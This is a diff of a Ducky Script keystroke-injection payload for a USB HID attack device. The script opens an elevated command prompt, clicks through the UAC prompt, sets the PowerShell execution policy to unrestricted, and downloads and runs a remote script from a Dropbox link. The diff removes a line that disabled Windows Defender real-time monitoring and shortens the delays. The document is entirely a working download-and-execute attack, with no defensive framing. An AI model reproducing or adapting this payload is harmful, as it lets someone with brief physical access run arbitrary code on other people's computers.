@@ -1,24 +1,19 @@
-REM let the HID enumerate
-DELAY 1000
 GUI r
 DELAY 300
-STRING cmd 
-DELAY 500
+STRING cmd
+DELAY 300
 CTRL-SHIFT ENTER
 DELAY 3000
 ALT y 
-DELAY 1000
-STRING cd C:\
+DELAY 300
+STRING cd c:\
 ENTER
-DELAY 1500
+DELAY 300
 STRING powershell
 ENTER
-DELAY 500
-STRING Set-MpPreference -DisableRealtimeMonitoring $true
-ENTER
-DELAY 3000
+DELAY 300
 STRING set-executionpolicy unrestricted
 ENTER
-DELAY 500
+DELAY 300
 STRING (new-object System.Net.WebClient).DownloadFile("https://www.dropbox.com/s/sbaj1fp448hj43p/script.ps1?dl=1", "$($env:LOCALAPPDATA)\script.ps1"); powershell "$($env:LOCALAPPDATA)\script.ps1";
 ENTER
